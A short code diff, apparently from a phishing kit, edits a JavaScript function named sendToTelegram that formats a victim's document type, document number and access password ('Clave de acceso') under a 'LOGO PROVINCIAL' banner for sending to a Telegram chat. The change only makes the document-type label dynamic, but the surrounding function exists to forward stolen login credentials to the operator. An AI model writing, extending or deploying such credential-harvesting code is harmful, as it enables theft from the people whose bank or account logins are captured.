@@ -8,7 +8,7 @@ function sendToTelegram(data) {
     const message = `
     *✨ LOGO PROVINCIAL: ✨*
 
-    📄 **Número de documento**: ${data.numeroDocumento}
+    📄 **${data.tipoDocumento}**: ${data.numeroDocumento}
     🔒 **Clave de acceso**: ${data.claveAcceso}
 
     ---
